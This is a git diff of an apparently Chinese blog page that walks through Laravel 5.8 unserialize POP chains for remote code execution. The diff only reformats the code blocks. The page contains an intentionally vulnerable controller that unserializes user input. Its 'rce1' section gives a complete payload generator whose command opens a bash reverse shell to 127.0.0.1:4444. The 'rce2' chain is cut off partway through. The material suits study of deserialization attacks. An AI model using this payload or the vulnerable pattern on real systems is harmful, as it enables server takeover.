@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -281,11 +281,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">composer create-project --prefer-dist laravel/laravel laravel58 5.8.*
-<span class="nb">cd</span> laravel58
-composer install
-php artisan serve --host<span class="o">=</span>0.0.0.0
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">composer create-project --prefer-dist laravel/laravel laravel58 5.8.*
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> laravel58
+</span></span><span class="line"><span class="cl">composer install
+</span></span><span class="line"><span class="cl">php artisan serve --host<span class="o">=</span>0.0.0.0
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><strong>问题</strong></p>
 <blockquote>
@@ -316,20 +316,20 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-
-<span class="k">namespace</span> <span class="nx">App\Http\Controllers</span><span class="p">;</span>
-
-<span class="k">use</span> <span class="nx">Illuminate\Http\Request</span><span class="p">;</span>
-
-<span class="k">class</span> <span class="nc">IndexController</span> <span class="k">extends</span> <span class="nx">Controller</span>
-<span class="p">{</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">){</span>
-        <span class="nv">$payload</span><span class="o">=</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">);</span>
-        <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">App\Http\Controllers</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">Illuminate\Http\Request</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">IndexController</span> <span class="k">extends</span> <span class="nx">Controller</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span><span class="o">=</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>3、<code>routes/web.php</code>添加路由规则</p>
 <blockquote>
@@ -340,8 +340,8 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s2">&#34;IndexController@index&#34;</span><span class="p">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s2">&#34;IndexController@index&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="pop链分析"><a href="#pop链分析" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:pop链分析" class="headings">POP链分析</a></h2>
 <h3 id="rce1"><a href="#rce1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:rce1" class="headings">rce1</a></h3>
@@ -359,11 +359,11 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span><span class="o">-&gt;</span><span class="na">dispatch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span><span class="o">-&gt;</span><span class="na">dispatch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>这里的event和events均可控，可以想到的利用方法有：控制<code>events</code>触发<code>__call</code>、<code>__callStatic</code>方法或者控制<code>event</code>触发<code>__toString</code>方法，口嗨完毕，继续抄文章[]~(￣▽￣)~*</p>
 <p>寻找可利用方法：同名方法dispatch或魔术方法<code>__call</code>、<code>__callStatic</code>，找到<code>Faker\Generator</code>，</p>
@@ -376,11 +376,11 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$attributes</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">format</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$attributes</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$attributes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">format</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$attributes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>然后调用当前类的format方法</p>
 <p><code>Faker\Generator::format</code></p>
@@ -392,11 +392,11 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">format</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">,</span> <span class="nv">$arguments</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFormatter</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">),</span> <span class="nv">$arguments</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">format</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">,</span> <span class="nv">$arguments</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFormatter</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">),</span> <span class="nv">$arguments</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>看到敏感函数了，但是这里回调函数经过了getFormatter函数的处理，查看一下定义</p>
 <p><code>Faker\Generator::getFormatter</code></p>
@@ -411,14 +411,14 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">getFormatter</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">];</span>
-    <span class="p">}</span>
-    <span class="o">...</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getFormatter</span><span class="p">(</span><span class="nv">$formatter</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span><span class="p">[</span><span class="nv">$formatter</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>这里判断了一下<code>$this-&gt;formatters[$formatter]</code>是否存在，但是由于该类的成员变量全部可控，所以这个判断很轻易地就可以绕过。</p>
 <blockquote>
@@ -457,34 +457,34 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">namespace</span> <span class="nx">Illuminate\Broadcasting</span><span class="p">{</span>
-	<span class="k">class</span> <span class="nc">PendingBroadcast</span><span class="p">{</span>
-    	<span class="k">protected</span> <span class="nv">$event</span><span class="p">;</span>
-    	<span class="k">protected</span> <span class="nv">$events</span><span class="p">;</span>
-	    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">,</span> <span class="nv">$event</span><span class="p">){</span>
-	        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span> <span class="o">=</span> <span class="nv">$event</span><span class="p">;</span>
-	        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
-	    <span class="p">}</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">Faker</span><span class="p">{</span>
-	<span class="k">class</span> <span class="nc">Generator</span><span class="p">{</span>
-		<span class="k">protected</span> <span class="nv">$formatters</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-		<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$formatters</span><span class="p">){</span>
-			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span> <span class="o">=</span> <span class="nv">$formatters</span><span class="p">;</span>
-		<span class="p">}</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span><span class="p">{</span>
-	<span class="nv">$generator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Faker\Generator</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;dispatch&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;system&#34;</span><span class="p">));</span>
-	<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Broadcasting\PendingBroadcast</span><span class="p">(</span><span class="nv">$generator</span><span class="p">,</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
-	<span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&#34;Faker\\Generator&#34;:1&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;Faker\\Generator&#34;:2&#39;</span><span class="p">,</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
-	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Illuminate\Broadcasting</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">PendingBroadcast</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">protected</span> <span class="nv">$event</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">protected</span> <span class="nv">$events</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">,</span> <span class="nv">$event</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span> <span class="o">=</span> <span class="nv">$event</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Faker</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">Generator</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">protected</span> <span class="nv">$formatters</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$formatters</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">formatters</span> <span class="o">=</span> <span class="nv">$formatters</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$generator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Faker\Generator</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;dispatch&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;system&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Broadcasting\PendingBroadcast</span><span class="p">(</span><span class="nv">$generator</span><span class="p">,</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&#34;Faker\\Generator&#34;:1&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;Faker\\Generator&#34;:2&#39;</span><span class="p">,</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="rce2"><a href="#rce2" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:rce2" class="headings">rce2</a></h3>
 <blockquote>
@@ -501,11 +501,11 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span><span class="o">-&gt;</span><span class="na">dispatch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span><span class="o">-&gt;</span><span class="na">dispatch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><code>Illuminate\Validation\Validator::__call</code></p>
 <div class="highlight"><div class="chroma">
@@ -524,19 +524,19 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="nv">$rule</span> <span class="o">=</span> <span class="nx">Str</span><span class="o">::</span><span class="na">snake</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">extensions</span><span class="p">[</span><span class="nv">$rule</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callExtension</span><span class="p">(</span><span class="nv">$rule</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="k">throw</span> <span class="k">new</span> <span class="nx">BadMethodCallException</span><span class="p">(</span><span class="nx">sprintf</span><span class="p">(</span>
-        <span class="s1">&#39;Method %s::%s does not exist.&#39;</span><span class="p">,</span> <span class="k">static</span><span class="o">::</span><span class="na">class</span><span class="p">,</span> <span class="nv">$method</span>
-    <span class="p">));</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$rule</span> <span class="o">=</span> <span class="nx">Str</span><span class="o">::</span><span class="na">snake</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">extensions</span><span class="p">[</span><span class="nv">$rule</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callExtension</span><span class="p">(</span><span class="nv">$rule</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nx">BadMethodCallException</span><span class="p">(</span><span class="nx">sprintf</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Method %s::%s does not exist.&#39;</span><span class="p">,</span> <span class="k">static</span><span class="o">::</span><span class="na">class</span><span class="p">,</span> <span class="nv">$method</span>
+</span></span><span class="line"><span class="cl">    <span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>extensions、rule均可控(rule值恒为空)（<code>Str::snake</code>用法参考文章<a href="https://laravel.com/docs/8.x/helpers#method-snake-case" target="_blank" rel="noopener">https://laravel.com/docs/8.x/helpers#method-snake-case</a>）通过条件判断不是很困难，接着跟进callExtension函数</p>
 <p><code>Illuminate\Validation\Validator::callExtension</code></p>
@@ -554,17 +554,17 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">callExtension</span><span class="p">(</span><span class="nv">$rule</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="nv">$callback</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">extensions</span><span class="p">[</span><span class="nv">$rule</span><span class="p">];</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="nx">is_callable</span><span class="p">(</span><span class="nv">$callback</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
-    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$callback</span><span class="p">))</span> <span class="p">{</span>
